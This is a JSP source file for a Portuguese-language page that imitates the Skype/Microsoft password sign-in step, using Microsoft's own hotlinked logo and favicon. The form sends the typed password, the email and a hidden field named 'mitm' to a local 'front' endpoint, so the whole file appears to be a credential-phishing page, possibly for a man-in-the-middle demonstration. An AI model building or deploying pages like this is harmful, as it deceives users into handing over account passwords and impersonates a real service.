<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <title>Entrar no Skype</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel=" icon" href="https://auth.gfx.ms/16.000.27887.2/images/favicon.ico"  type="image/png" />
        <link rel="stylesheet" href="CSS/materialize.min.css"/>
        <link rel="stylesheet" href="CSS/app.css"/>
        <script src="JS/materialize.min.js"></script>
    </head>

    <body >

        <br><br><br><br><br>
        <img src="Images/icon.png" id="icon"/>
        <div class="valign-wrapper">

        </div>
        <br>
        <div class="row">
            <div class="col s12 m8 offset-m3 l4 offset-l4">
                <div class="card">
                    <div class="card-content">
                            <br>
                            <img src="https://auth.gfx.ms/16.000.27887.2/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9"/>
                            <br><br><a href="index.html"><-</a>${email}<br>

                            <h5><b>Insira a senha</b></h5>
                            <form method="post" action="front">
                                <input type="password" placeholder="Senha" name="senha"/>
                                <br>
                                <input type="checkbox" class="filled-in"/>
                                <input type="hidden" name="mitm" value="mitm"/>
                                <input type="hidden" name="email" value="${email}"/>
                                <label>
                                    <input type="checkbox">
                                    <span>Mantenha-me conectado</span>
                                </label>
                                <br>
                                <br><label style="font-size: 12px"><a href="#">
                                        Esqueci minha senha</a></label>
                                <br>

                                <input type="submit" value="Entrar" class="btn"/>
                                <br><br>

                        </form>

                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
